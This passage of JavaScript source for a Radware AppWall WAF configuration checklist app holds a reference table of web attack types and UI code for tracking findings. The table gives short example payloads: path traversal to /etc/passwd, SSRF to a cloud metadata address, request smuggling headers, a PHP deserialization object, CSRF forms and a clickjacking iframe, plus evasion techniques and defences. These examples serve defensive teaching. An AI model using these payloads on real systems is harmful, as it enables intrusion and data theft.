                'DTD loading from remote sources'
            ],
            protection: [
                'Disable external entities in XML parsers',
                'Disable DTD processing',
                'Use less complex data formats (JSON)',
                'WAF signatures for XXE patterns',
                'Input validation'
            ]
        },
        'path-traversal': {
            name: 'Path Traversal',
            description: 'Attackers access files outside the intended directory using relative path sequences.',
            examples: [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            evasionTechniques: [
                'Double encoding (%252e%252e%252f)',
                'Path normalization bypasses',
                'Non-standard path separators',
                'URL encoded sequences',
                'Null byte injection (file.txt%00.jpg)'
            ],
            protection: [
                'Input validation and sanitization',
                'Path canonicalization before validation',
                'Proper permission boundaries',
                'WAF signatures for path patterns',
                'Whitelisting allowed resources'
            ]
        },
        'ssrf': {
            name: 'Server-Side Request Forgery (SSRF)',
            description: 'Attackers force the server to make unintended requests to internal or external systems.',
            examples: [
                "http://internal-system/admin",
                "https://169.254.169.254/latest/meta-data/",
                "http://localhost:8080/admin"
            ],
            evasionTechniques: [
                'IP encoding variations (decimal, octal, hex)',
                'Domain redirections',
                'URL schema bypasses (gopher://, file://)',
                'DNS rebinding attacks',
                'Non-standard/enclosed IPv4 forms'
            ],
            protection: [
                'Whitelist allowed destinations',
                'Block internal networks/addresses',
                'DNS resolution validation',
                'Disable redirects or limit redirect chains',
                'HTTP library hardening'
            ]
        },
        'request-smuggling': {
            name: 'HTTP Request Smuggling',
            description: 'Attackers exploit differences in how front/backend servers process HTTP requests.',
            examples: [
                "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\nQ",
                "Content-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com"
            ],
            evasionTechniques: [
                'CL.TE vs TE.CL vulnerability exploitation',
                'Obfuscated headers',
                'Chunked encoding variations',
                'Header smuggling techniques',
                'Line folding abuse'
            ],
            protection: [
                'Consistent HTTP parsing between servers',
                'HTTP request validation',
                'Strict protocol compliance',
                'Security headers',
                'Connection timeout settings'
            ]
        },
        'deserialization': {
            name: 'Insecure Deserialization',
            description: 'Attackers exploit flaws in how applications reconstruct data from serialized formats.',
            examples: [
                "O:8:\"Example\":1:{s:11:\"executeCode\";s:10:\"phpinfo();\"}",
                "{\"$type\":\"System.IO.FileInfo, System\",\"fileName\":\"C:/sensitive.txt\"}"
            ],
            evasionTechniques: [
                'Custom payload construction',
                'Gadget chain exploitation',
                'Nested serialized objects',
                'Type confusion attacks',
                'Format-specific obfuscation'
            ],
            protection: [
                'Avoid deserializing untrusted data',
                'Integrity checking (signatures/HMAC)',
                'Deserialization filtering',
                'Safe deserializer libraries',
                'Data type validation'
            ]
        },
        'csrf': {
            name: 'Cross-Site Request Forgery (CSRF)',
            description: 'Attackers trick users into making unwanted requests to websites where they\'re authenticated.',
            examples: [
                "<img src=\"https://bank.com/transfer?to=attacker&amount=1000\">",
                "<form id=\"csrf\" action=\"https://bank.com/transfer\" method=\"POST\"><input type=\"hidden\" name=\"to\" value=\"attacker\"><input type=\"hidden\" name=\"amount\" value=\"1000\"></form><script>document.getElementById(\"csrf\").submit()< /script>"
            ],
            evasionTechniques: [
                'XHR/fetch with custom headers',
                'Clickjacking for user interaction',
                'Same-site request initiation',
                'Flash/plugin-based cross-domain requests',
                'Timing attacks on token validation'
            ],
            protection: [
                'CSRF tokens',
                'SameSite cookie attribute',
                'Custom header validation',
                'Referrer checking',
                'Requiring user interaction for sensitive actions'
            ]
        },
        'clickjacking': {
            name: 'Clickjacking',
            description: 'Attackers trick users into clicking on hidden or disguised interface elements.',
            examples: [
                "<iframe src=\"https://bank.com/transfer\" style=\"opacity:0.1;position:absolute;z-index:2\"></iframe><button style=\"position:relative;z-index:1\">Click to Win</button>"
            ],
            evasionTechniques: [
                'Multiple nested iframes',
                'Opacity manipulation',
                'CSS z-index layering',
                'Timing-based tricks',
                'Drag and drop attacks'
            ],
            protection: [
                'X-Frame-Options header',
                'Content-Security-Policy (frame-ancestors)',
                'Frame-busting JavaScript',
                'Proper context validation',
                'User interaction confirmation'
            ]
        }
    },
    
    // Site-specific security configurations
    securityTemplates: [
        {
            name: "E-commerce Platform",
            description: "Protection tailored for online shopping applications with payments",
            priorities: [
                { category: "signatures", priority: "critical" },
                { category: "authentication", priority: "critical" },
                { category: "threat-protection", priority: "critical" },
                { category: "compliance", priority: "high" }
            ],
            focusAreas: [
                "PCI DSS compliance",
                "Credit card data protection",
                "Bot prevention for scalping/fraud",
                "API security for checkout process"
            ]
        },
        {
            name: "Banking Portal",
            description: "Maximum security for financial applications",
            priorities: [
                { category: "authentication", priority: "critical" },
                { category: "signatures", priority: "critical" },
                { category: "protocol", priority: "critical" },
                { category: "high-availability", priority: "critical" }
            ],
            focusAreas: [
                "Multi-factor authentication protection",
                "Transaction monitoring and validation",
                "Account takeover prevention",
                "Zero downtime operation"
            ]
        },
        {
            name: "Healthcare Application",
            description: "Protection for applications with sensitive health information",
            priorities: [
                { category: "authentication", priority: "critical" },
                { category: "compliance", priority: "critical" },
                { category: "signatures", priority: "high" },
                { category: "reporting", priority: "high" }
            ],
            focusAreas: [
                "HIPAA compliance",
                "PHI data leakage prevention",
                "Medical record access controls",
                "Comprehensive audit logging"
            ]
        }
    ]
};

// --- Initialization ---
document.addEventListener('DOMContentLoaded', initApp);

function initApp() {
    loadProjectsFromStorage();
    setupEventListeners();
    populateCategoryCards();
    populateFindingsTable();
    populateFindingCategoryOptions();
    updateProjectUI();
    updateProgressIndicators();
    setupSearchAndFiltering();
    console.log("Radware AppWall WAF Configuration Checklist Initialized");
}

// --- Event Listeners Setup ---
function setupEventListeners() {
    // Tab navigation
    document.querySelectorAll('.tab-link').forEach(tab => {
        tab.addEventListener('click', function(e) {
            e.preventDefault();
            const tabName = this.getAttribute('data-tab');
            changeTab(tabName);
        });
    });

    // Back button
    document.getElementById('btn-back')?.addEventListener('click', function(e) {
        e.preventDefault();
        closeCategory();
    });

    // Category cards event delegation
    document.getElementById('categories-container').addEventListener('click', function(e) {
        const categoryCard = e.target.closest('.category-card');
        if (categoryCard) {
            const categoryId = categoryCard.getAttribute('data-category');
            if (categoryId) {
                openCategory(categoryId);
            }
        }
    });

    // Modal close buttons
    document.querySelectorAll('.modal-close').forEach(btn => {
        btn.addEventListener('click', function() {
            const modal = this.closest('[id$="-modal"]');
            if (modal) toggleModal(modal.id, false);
        });
    });

    // Finding buttons
    document.getElementById('btn-add-finding')?.addEventListener('click', function() {
        openAddFindingModal();
    });

    document.getElementById('btn-save-finding')?.addEventListener('click', function() {
        saveFinding();
    });

    // Set up dynamic event delegation for tasks and other buttons added dynamically
    document.addEventListener('click', function(e) {
        // Task status buttons
        if (e.target.classList.contains('status-btn')) {
            const statusBtn = e.target;
            const taskItem = statusBtn.closest('.task-item');
            if (taskItem) {
                const taskId = taskItem.getAttribute('data-task-id');
                const status = statusBtn.getAttribute('data-status');
                updateTaskStatus(taskId, status);
                
                // Update button states
                taskItem.querySelectorAll('.status-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
                statusBtn.classList.add('active');
            }
        }
        
        // Add finding buttons
        if (e.target.closest('.action-btn.add-finding')) {
            const btn = e.target.closest('.action-btn.add-finding');
            e.stopPropagation();
            const category = btn.getAttribute('data-category');
            openAddFindingModal(category);
        }
        
        // View findings buttons
        if (e.target.closest('.action-btn.view-findings')) {
            const btn = e.target.closest('.action-btn.view-findings');
            e.stopPropagation();
            const category = btn.getAttribute('data-category');
            openViewFindingModal(category);
        }
    });

    // Save notes button
    document.getElementById('btn-save-notes')?.addEventListener('click', function() {
        saveNotes();
    });

    // Report generation
    document.getElementById('btn-generate-report')?.addEventListener('click', function() {
        toggleModal('export-modal', true);
    });

    document.getElementById('btn-do-export')?.addEventListener('click', function() {
        exportReport();
    });

    // View and edit finding buttons
    document.getElementById('btn-edit-finding')?.addEventListener('click', function() {
        editCurrentFinding();
    });

    document.getElementById('btn-delete-finding')?.addEventListener('click', function() {
        confirmDeleteFinding();
    });

    document.getElementById('confirm-yes')?.addEventListener('click', function() {
        if (confirmCallback) {
            confirmCallback();
        }
        toggleModal('confirm-modal', false);
    });

    // Project management
    document.getElementById('btn-edit-project')?.addEventListener('click', function() {
        openEditProjectModal();
    });
    
    // Search and filter
    document.getElementById('search-input')?.addEventListener('input', function() {
        searchQuery = this.value.toLowerCase();
        applySearchAndFilter();
    });
    
    document.getElementById('filter-dropdown')?.addEventListener('change', function() {
        filterActive = this.value !== 'all';
        applySearchAndFilter();
    });
}

// --- Dynamic UI Rendering ---
function populateCategoryCards() {
    const container = document.getElementById('categories-container');
    if (!container) return;

    container.innerHTML = '';
    
    appwallData.categories.forEach(category => {
        const priorityClass = getPriorityClass(category.priority);
        const cardHTML = `
            <div class="category-card bg-white rounded-xl shadow-lg overflow-hidden border border-gray-100 transition duration-300 hover:shadow-xl transform hover:-translate-y-1 cursor-pointer" data-category="${category.id}">
                <div class="px-6 py-5 bg-radware-primary/5">
                    <span class="inline-flex items-center px-3 py-1 text-xs font-semibold ${priorityClass.bgClass} ${priorityClass.textClass} rounded-full">
                        ${capitalizeFirstLetter(category.priority)} Priority
                    </span>
                </div>
                <div class="p-6">
                    <div class="flex items-start gap-4 mb-4">
                        <div class="${priorityClass.bgSolid} text-white p-3 rounded-lg flex-shrink-0 shadow-md">
                            <i class="fas ${category.icon}"></i>
                        </div>
                        <h3 class="text-xl font-semibold text-gray-900">${category.title}</h3>
                    </div>
                    <p class="text-gray-600 mb-4 line-clamp-2">${category.subtitle}</p>
                    <div class="flex justify-between items-center pt-4 border-t border-gray-100">
                        <span class="bg-gray-100 text-gray-700 px-3 py-1 rounded-full text-sm font-medium" id="${category.id}-progress">${category.progress}% complete</span>
                        <span class="text-radware-primary font-semibold text-sm flex items-center gap-1 hover:text-radware-secondary transition-colors">
                            View settings <i class="fas fa-arrow-right text-xs"></i>
                        </span>
                    </div>
                </div>
            </div>
        `;
        
        container.innerHTML += cardHTML;
    });
}

function populateFindingsTable() {
    const tableBody = document.getElementById('findings-table-body');
    if (!tableBody) return;
    
    tableBody.innerHTML = '';
    
    // Create a map of findings by category
    const findingsByCategory = {};
    
    appwallData.findings.forEach(finding => {
        if (!findingsByCategory[finding.category]) {
            findingsByCategory[finding.category] = {
                high: 0,
                medium: 0,
                low: 0,
                info: 0
            };
        }
        
        findingsByCategory[finding.category][finding.severity]++;
    });
    
    // Populate the table
    Object.keys(findingsByCategory).forEach(categoryId => {
        const category = appwallData.categories.find(c => c.id === categoryId);
        if (!category) return;
        
        const counts = findingsByCategory[categoryId];
        const total = counts.high + counts.medium + counts.low + counts.info;
        
        const rowHTML = `
            <tr>
                <td class="px-5 py-4 border-b border-gray-200">${category.title}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.high > 0 ? 'text-status-critical font-semibold' : ''}">${counts.high}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.medium > 0 ? 'text-status-high font-semibold' : ''}">${counts.medium}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.low > 0 ? 'text-status-medium font-semibold' : ''}">${counts.low}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center ${counts.info > 0 ? 'text-radware-primary font-semibold' : ''}">${counts.info}</td>
                <td class="px-5 py-4 border-b border-gray-200 text-center font-semibold">${total}</td>
                <td class="px-5 py-4 border-b border-gray-200">
                    <div class="flex gap-2">
                        <button class="action-btn add-finding text-radware-primary hover:text-radware-secondary hover:bg-radware-primary/10 px-3 py-2 rounded-md transition" data-category="${categoryId}">
                            <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                        </button>
                        <button class="action-btn view-findings text-radware-primary hover:text-radware-secondary hover:bg-radware-primary/10 px-3 py-2 rounded-md transition" data-category="${categoryId}">
                            <i class="fas fa-eye"></i> <span class="hidden sm:inline">View (${total})</span>
                        </button>
                    </div>
                </td>
            </tr>
        `;
        
        tableBody.innerHTML += rowHTML;
    });
}

function populateFindingCategoryOptions() {
    const categorySelect = document.getElementById('finding-category');
    if (!categorySelect) return;
    
    categorySelect.innerHTML = '';
    
    appwallData.categories.forEach(category => {
        const option = document.createElement('option');
        option.value = category.id;
        option.textContent = category.title;
        categorySelect.appendChild(option);
    });
}

function renderCategoryChecklist(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    if (!category) return;
    
    const checklistTab = document.getElementById('checklist-tab');
    if (!checklistTab) return;
    
    checklistTab.innerHTML = '';
    
    category.checklist.forEach(group => {
        let groupHTML = `
            <div class="mb-8 rounded-lg overflow-hidden border border-gray-200 shadow-lg">
                <h3 class="checklist-group-title bg-gray-100 p-4 border-b border-gray-200 font-semibold flex items-center gap-2">
                    <i class="fas ${group.icon} text-radware-primary"></i>
                    ${group.title}
                </h3>
        `;
        
        group.items.forEach((item, index) => {
            const isLast = index === group.items.length - 1;
            const priorityClass = getPriorityIndicator(item.priority);
            
            groupHTML += `
                <div class="task-item flex items-start p-4 ${isLast ? '' : 'border-b border-gray-200'} hover:bg-gray-50" data-task-id="${item.id}" data-priority="${item.priority}">
                    <div class="task-status mr-3 mt-1">
                        <div class="status-controls">
                            <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested">○</button>
                            <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed">✓</button>
                            <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                        </div>
                    </div>
                    <div class="task-text flex-1">
                        <span class="flex items-center gap-2">
                            ${item.text}
                            ${priorityClass ? `<span class="inline-block h-2 w-2 ${priorityClass} rounded-full" title="${capitalizeFirstLetter(item.priority)} priority"></span>` : ''}
                        </span>
                    </div>
                </div>
            `;
        });
        
        groupHTML += `</div>`;
        checklistTab.innerHTML += groupHTML;
    });
    
    // Update task status from saved project data
    updateTaskStatusFromProject();
}

function renderCategoryTechniques(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    if (!category || !category.techniques) return;
    
    const techniquesTab = document.getElementById('techniques-tab');
    if (!techniquesTab) return;
    
    techniquesTab.innerHTML = '<div class="space-y-8"></div>';
    const container = techniquesTab.querySelector('.space-y-8');
    
    category.techniques.forEach(technique => {
        const techniqueHTML = `
            <div class="bg-white rounded-lg border border-gray-200 shadow-lg overflow-hidden">
                <h4 class="text-lg font-semibold p-5 border-b border-gray-200 flex items-center gap-2">
                    <span class="w-2 h-2 bg-radware-accent rounded-full inline-block"></span>
                    ${technique.title}
                </h4>
                <div class="p-5">
                    ${technique.content}
                </div>
            </div>
        `;
        
        container.innerHTML += techniqueHTML;
    });
}

function renderCategoryTools(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    if (!category || !category.tools) return;
    
    const toolsTab = document.getElementById('tools-tab');
    if (!toolsTab) return;
    
    toolsTab.innerHTML = '<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>';
    const container = toolsTab.querySelector('.grid');
    
    category.tools.forEach(tool => {
        const toolHTML = `
            <div class="bg-white rounded-lg border border-gray-200 shadow-lg overflow-hidden transition duration-300 hover:shadow-xl transform hover:-translate-y-1">
                <div class="p-5 border-b border-gray-200">
                    <div class="flex gap-4">
                        <div class="bg-gradient-to-r from-radware-primary to-radware-secondary p-3 rounded-lg text-white text-xl shadow-md">
                            <i class="fas ${tool.icon}"></i>
                        </div>
                        <h4 class="text-lg font-semibold text-gray-900">${tool.title}</h4>
                    </div>
                </div>
                <div class="p-5">
                    <p class="text-gray-700 mb-4 min-h-[72px]">${tool.description}</p>
                    <a href="${tool.link}" target="_blank" class="bg-gradient-to-r from-radware-primary to-radware-secondary text-white px-4 py-2 rounded-full inline-flex items-center gap-2 shadow-md hover:shadow-lg transition">
                        <span>${tool.linkText}</span>
                        <i class="fas fa-external-link-alt text-xs"></i>
                    </a>
                </div>
            </div>
        `;
        
        container.innerHTML += toolHTML;
    });
}

function openViewFindingModal(categoryId) {
    // In a real app, you would show findings for the specific category
    // For this demo, we'll show the first finding from the category
    const finding = appwallData.findings.find(f => f.category === categoryId);
    if (!finding) return;
    
    const modalTitle = document.getElementById('view-finding-title');
    const modalContent = document.getElementById('view-finding-content');
    
    if (modalTitle) modalTitle.textContent = 'Configuration Issue Details';
    
    if (modalContent) {
        const severityClass = getSeverityClasses(finding.severity);
        
        modalContent.innerHTML = `
            <div class="flex items-center gap-3 mb-4">
                <span class="inline-flex items-center px-3 py-1 text-xs font-semibold ${severityClass.bgClass} ${severityClass.textClass} rounded-full">
                    ${capitalizeFirstLetter(finding.severity)} Severity
                </span>
                <span class="text-sm text-gray-500">Category: ${getCategoryTitle(finding.category)}</span>
            </div>
            
            <div>
                <h4 class="text-lg font-semibold mb-2">${finding.title}</h4>
                <div class="bg-gray-50 rounded-lg p-4 mb-4">
                    <p>${finding.description}</p>
                </div>
            </div>
            
            <div>
                <h4 class="text-base font-semibold mb-2">Recommended Remediation</h4>
                <div class="bg-gray-50 rounded-lg p-4 mb-4">
                    <p>${finding.remediation}</p>
                </div>
            </div>
            
            <div>
                <h4 class="text-base font-semibold mb-2">Configuration Commands</h4>
                <div class="code-block">
                    ${formatConfigCommands(finding.config)}
                </div>
            </div>
        `;
    }
    
    // Store current finding ID for edit/delete operations
    currentEditingFindingId = finding.id;
    
    toggleModal('view-finding-modal', true);
}

// --- Modal Management ---
function toggleModal(modalId, show) {
    const modal = document.getElementById(modalId);
    if (!modal) return;
    
    if (show) {
        modal.classList.remove('hidden');
    } else {
        modal.classList.add('hidden');
    }
}

function openAddFindingModal(categoryId = null) {
    const modal = document.getElementById('finding-modal');
    const categorySelect = document.getElementById('finding-category');
    const modalTitle = document.getElementById('finding-modal-title');
    
    if (modalTitle) {
        modalTitle.textContent = currentEditingFindingId ? 'Edit Configuration Issue' : 'Add Configuration Issue';
    }
    
    if (modal && categorySelect && categoryId) {
        categorySelect.value = categoryId;
    }
    
    // If editing an existing finding, populate the form
    if (currentEditingFindingId) {
        const finding = appwallData.findings.find(f => f.id === currentEditingFindingId);
        if (finding) {
            document.getElementById('finding-title').value = finding.title;
            document.getElementById('finding-severity').value = finding.severity;
            document.getElementById('finding-description').value = finding.description;
            document.getElementById('finding-remediation').value = finding.remediation;
            document.getElementById('finding-config').value = finding.config;
            if (categorySelect) categorySelect.value = finding.category;
        }
    } else {
        // Clear the form for new findings
        document.getElementById('finding-title').value = '';
        document.getElementById('finding-description').value = '';
        document.getElementById('finding-remediation').value = '';
        document.getElementById('finding-config').value = '';
    }
    
    toggleModal('finding-modal', true);
}

function openEditProjectModal() {
    if (!currentProject) return;
    
    // In a real implementation, populate the form with current project details
    // and open a modal to edit them
    
    showToast('Project editing functionality would be implemented here', 'info');
}

function saveFinding() {
    const title = document.getElementById('finding-title').value;
    const category = document.getElementById('finding-category').value;
    const severity = document.getElementById('finding-severity').value;
    const description = document.getElementById('finding-description').value;
    const remediation = document.getElementById('finding-remediation').value;
    const config = document.getElementById('finding-config').value;
    
    if (!title || !category || !severity) {
        showToast('Please fill in all required fields', 'error');
        return;
    }
    
    if (currentEditingFindingId) {
        // Update existing finding
        const findingIndex = appwallData.findings.findIndex(f => f.id === currentEditingFindingId);
        if (findingIndex !== -1) {
            appwallData.findings[findingIndex] = {
                id: currentEditingFindingId,
                title,
                category,
                severity,
                description,
                remediation,
                config
            };
            
            // Clone findings to project storage
            if (currentProject) {
                currentProject.findingDetails = [...appwallData.findings];
                saveProjectToStorage();
            }
            
            showToast('Configuration issue updated successfully', 'success');
        }
    } else {
        // Add new finding
        const newFinding = {
            id: 'finding-' + Date.now(),
            title,
            category,
            severity,
            description,
            remediation,
            config
        };
        
        appwallData.findings.push(newFinding);
        
        // Clone findings to project storage
        if (currentProject) {
            currentProject.findingDetails = [...appwallData.findings];
            saveProjectToStorage();
        }
        
        showToast('Configuration issue saved successfully', 'success');
    }
    
    // Reset current editing state
    currentEditingFindingId = null;
    
    // Update findings table
    populateFindingsTable();
    
    toggleModal('finding-modal', false);
}

function editCurrentFinding() {
    if (currentEditingFindingId) {
        toggleModal('view-finding-modal', false);
        openAddFindingModal();
    }
}

function confirmDeleteFinding() {
    if (!currentEditingFindingId) return;
    
    document.getElementById('confirm-message').textContent = 'Are you sure you want to delete this configuration issue? This action cannot be undone.';
    
    confirmCallback = () => {
        const findingIndex = appwallData.findings.findIndex(f => f.id === currentEditingFindingId);
        if (findingIndex !== -1) {
            appwallData.findings.splice(findingIndex, 1);
            
            // Update project storage
            if (currentProject) {
                currentProject.findingDetails = [...appwallData.findings];
                saveProjectToStorage();
            }
            
            showToast('Configuration issue deleted successfully', 'success');
            populateFindingsTable();
            toggleModal('view-finding-modal', false);
            currentEditingFindingId = null;
        }
    };
    
    toggleModal('confirm-modal', true);
}

// --- Category Management ---
function openCategory(categoryId) {
    currentCategory = categoryId;
    
    // Initialize category data if needed
    initializeCategoryData(categoryId);
    
    // Show category details section
    document.getElementById('categories-section').style.display = 'none';
    document.getElementById('category-details').style.display = 'block';
    
    // Update header
    document.getElementById('details-title').textContent = getCategoryTitle(categoryId);
    document.getElementById('details-subtitle').textContent = getCategorySubtitle(categoryId);
    
    // Render category content
    renderCategoryChecklist(categoryId);
    renderCategoryTechniques(categoryId);
    renderCategoryTools(categoryId);
    
    // Load notes if available
    loadCategoryNotes(categoryId);
    
    // Set active tab
    changeTab('checklist');
    
    // Scroll to top
    window.scrollTo(0, 0);
}

function closeCategory() {
    document.getElementById('categories-section').style.display = 'block';
    document.getElementById('category-details').style.display = 'none';
    currentCategory = '';
}

function changeTab(tabName) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.add('hidden');
    });
    
    // Remove active class from all tab links
    document.querySelectorAll('.tab-link').forEach(link => {
        link.classList.remove('active');
    });
    
    // Show selected tab
    const selectedTab = document.getElementById(tabName + '-tab');
    if (selectedTab) {
        selectedTab.classList.remove('hidden');
    }
    
    // Add active class to selected tab link
    const selectedLink = document.querySelector(`.tab-link[data-tab="${tabName}"]`);
    if (selectedLink) {
        selectedLink.classList.add('active');
    }
}

// --- Task Status Management ---
function updateTaskStatus(taskId, status) {
    if (!taskId || !status || !currentProject) return;
    
    // Initialize taskStatus if it doesn't exist
    if (!currentProject.taskStatus) {
        currentProject.taskStatus = {};
    }
    
    // Update the task status
    currentProject.taskStatus[taskId] = status;
    
    // Save project and update progress indicators
    saveProjectToStorage();
    updateProgressIndicators();
    showToast('Task status updated', 'success');
}

function updateTaskStatusFromProject() {
    if (!currentProject || !currentProject.taskStatus) return;
    
    // For each saved task status, update the UI
    Object.entries(currentProject.taskStatus).forEach(([taskId, status]) => {
        const taskItem = document.querySelector(`.task-item[data-task-id="${taskId}"]`);
        if (taskItem) {
            const statusBtns = taskItem.querySelectorAll('.status-btn');
            statusBtns.forEach(btn => {
                btn.classList.remove('active');
                if (btn.getAttribute('data-status') === status) {
                    btn.classList.add('active');
                }
            });
        }
    });
}

// --- Notes Management ---
function saveNotes() {
    if (!currentCategory || !currentProject) return;
    
    const notesTextarea = document.getElementById('category-notes');
    if (!notesTextarea) return;
    
    // Initialize notes object if it doesn't exist
    if (!currentProject.notes) {
        currentProject.notes = {};
    }
    
    // Save notes for current category
    currentProject.notes[currentCategory] = notesTextarea.value;
    
    // Save project
    saveProjectToStorage();
    showToast('Notes saved successfully', 'success');
}

function loadCategoryNotes(categoryId) {
    if (!categoryId || !currentProject || !currentProject.notes) return;
    
    const notesTextarea = document.getElementById('category-notes');
    if (notesTextarea) {
        notesTextarea.value = currentProject.notes[categoryId] || '';
    }
}

// --- Report Export ---
function exportReport() {
    const format = document.getElementById('export-format').value;
    const detail = document.getElementById('export-detail').value;
    const includeNotes = document.getElementById('export-include-notes').checked;
    
    // In a real app, this would generate and save the report in the selected format
    // For demo purposes, just show a toast message
    
    showToast(`Report export initiated in ${format} format with ${detail} detail level`, 'success');
    toggleModal('export-modal', false);
}

// --- Progress Indicators ---
function updateProgressIndicators() {
    if (!currentProject || !currentProject.taskStatus) return;
    
    // Calculate progress for each category and overall progress
    const taskStatuses = currentProject.taskStatus;
    const categoryStats = {};
    let totalTasks = 0;
    let completedTasks = 0;
    let criticalTotal = 0;
    let criticalCompleted = 0;
    let highTotal = 0;
    let highCompleted = 0;
    let mediumTotal = 0;
    let mediumCompleted = 0;
    
    // Count all tasks and completions
    appwallData.categories.forEach(category => {
        categoryStats[category.id] = { total: 0, completed: 0 };
        
        category.checklist.forEach(group => {
            group.items.forEach(item => {
                totalTasks++;
                categoryStats[category.id].total++;
                
                if (item.priority === 'critical') criticalTotal++;
                if (item.priority === 'high') highTotal++;
                if (item.priority === 'medium') mediumTotal++;
                
                const status = taskStatuses[item.id];
                if (status === TASK_STATUS.PASSED) {
                    completedTasks++;
                    categoryStats[category.id].completed++;
                    
                    if (item.priority === 'critical') criticalCompleted++;
                    if (item.priority === 'high') highCompleted++;
                    if (item.priority === 'medium') mediumCompleted++;
                }
            });
        });
    });
    
    // Update overall progress
    const overallPercent = Math.round((completedTasks / totalTasks) * 100) || 0;
    document.getElementById('overall-progress').textContent = `${overallPercent}%`;
    document.getElementById('overall-progress-bar').style.width = `${overallPercent}%`;
    
    // Update priority progress
    const criticalPercent = Math.round((criticalCompleted / criticalTotal) * 100) || 0;
    document.getElementById('critical-progress').textContent = `${criticalCompleted}/${criticalTotal}`;
    document.getElementById('critical-progress-bar').style.width = `${criticalPercent}%`;
    
    const highPercent = Math.round((highCompleted / highTotal) * 100) || 0;
    document.getElementById('high-progress').textContent = `${highCompleted}/${highTotal}`;
    document.getElementById('high-progress-bar').style.width = `${highPercent}%`;
    
    const mediumPercent = Math.round((mediumCompleted / mediumTotal) * 100) || 0;
    document.getElementById('medium-progress').textContent = `${mediumCompleted}/${mediumTotal}`;
    document.getElementById('medium-progress-bar').style.width = `${mediumPercent}%`;
    
    // Update category progress
    Object.entries(categoryStats).forEach(([categoryId, stats]) => {
        const percent = Math.round((stats.completed / stats.total) * 100) || 0;
        const progressElement = document.getElementById(`${categoryId}-progress`);
        if (progressElement) {
            progressElement.textContent = `${percent}% complete`;
        }
        
        // Update the stored progress in appwallData (for new renderings)
        const category = appwallData.categories.find(c => c.id === categoryId);
        if (category) {
            category.progress = percent;
        }
    });
    
    // Update last updated timestamp
    if (currentProject) {
        currentProject.lastUpdated = new Date().toISOString();
        document.getElementById('project-updated').textContent = formatDate(currentProject.lastUpdated);
    }
}

// --- Search and Filtering ---
function setupSearchAndFiltering() {
    // This would add search and filter UI to the page in a real implementation
    // For example, adding a search input and filter dropdown in the appropriate sections
}

function applySearchAndFilter() {
    if (!currentCategory) {
        // If on main dashboard, filter the category cards
        filterCategoryCards();
    } else {
        // If in a specific category, filter the tasks
        filterTaskItems();
    }
}

function filterCategoryCards() {
    const cards = document.querySelectorAll('.category-card');
    
    cards.forEach(card => {
        const categoryId = card.getAttribute('data-category');
        const category = appwallData.categories.find(c => c.id === categoryId);
        
        if (!category) return;
        
        const titleMatch = category.title.toLowerCase().includes(searchQuery);
        const subtitleMatch = category.subtitle.toLowerCase().includes(searchQuery);
        const priorityMatch = !filterActive || category.priority === document.getElementById('filter-dropdown')?.value;
        
        if ((titleMatch || subtitleMatch) && priorityMatch) {
            card.style.display = 'block';
        } else {
            card.style.display = 'none';
        }
    });
}

function filterTaskItems() {
    const tasks = document.querySelectorAll('.task-item');
    
    tasks.forEach(task => {
        const taskText = task.querySelector('.task-text')?.textContent.toLowerCase() || '';
        const taskPriority = task.getAttribute('data-priority');
        
        const textMatch = taskText.includes(searchQuery);
        const priorityMatch = !filterActive || taskPriority === document.getElementById('filter-dropdown')?.value;
        
        if (textMatch && priorityMatch) {
            task.style.display = 'flex';
        } else {
            task.style.display = 'none';
        }
    });
}

// --- Project Management ---
function loadProjectsFromStorage() {
    try {
        const data = localStorage.getItem(STORAGE_KEY);
        if (data) {
            projects = JSON.parse(data);
            
            // Load first project or create default
            if (Object.keys(projects).length > 0) {
                currentProject = projects[Object.keys(projects)[0]];
                
                // If project has findings, load them
                if (currentProject.findingDetails && currentProject.findingDetails.length > 0) {
                    appwallData.findings = currentProject.findingDetails;
                }
            } else {
                createDefaultProject();
            }
        } else {
            createDefaultProject();
        }
    } catch (error) {
        console.error('Error loading projects from storage:', error);
        createDefaultProject();
    }
}

function createDefaultProject() {
    const defaultId = 'default';
    currentProject = {
        id: defaultId,
        name: 'Radware AppWall Configuration',
        target: 'production.example.com',
        date: new Date().toISOString().split('T')[0],
        tester: 'WAF Administrator',
        scope: 'E-commerce platform, Customer portal, Admin interface',
        lastUpdated: new Date().toISOString(),
        taskStatus: {},
        notes: {},
        findingDetails: [...appwallData.findings] // Clone initial findings
    };
    
    projects = { [defaultId]: currentProject };
    saveProjectToStorage();
}

function saveProjectToStorage() {
    try {
        if (currentProject && currentProject.id) {
            // Update the current project in the projects object
            projects[currentProject.id] = currentProject;
            
            // Save all projects to localStorage
            localStorage.setItem(STORAGE_KEY, JSON.stringify(projects));
        }
    } catch (error) {
        console.error('Error saving project to storage:', error);
        showToast('Failed to save project. Storage might be full.', 'error');
    }
}

function updateProjectUI() {
    if (!currentProject) return;
    
    // Update project info section
    document.getElementById('project-name').textContent = currentProject.name || 'Unnamed Project';
    document.getElementById('project-target').textContent = currentProject.target || 'N/A';
    document.getElementById('project-date').textContent = formatDate(currentProject.date);
    document.getElementById('project-tester').textContent = currentProject.tester || 'N/A';
    document.getElementById('project-scope').textContent = currentProject.scope || 'N/A';
    document.getElementById('project-updated').textContent = formatDate(currentProject.lastUpdated);
}

// --- Helper Functions ---
function getCategoryTitle(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    return category ? category.title : 'Unknown Category';
}

function getCategorySubtitle(categoryId) {
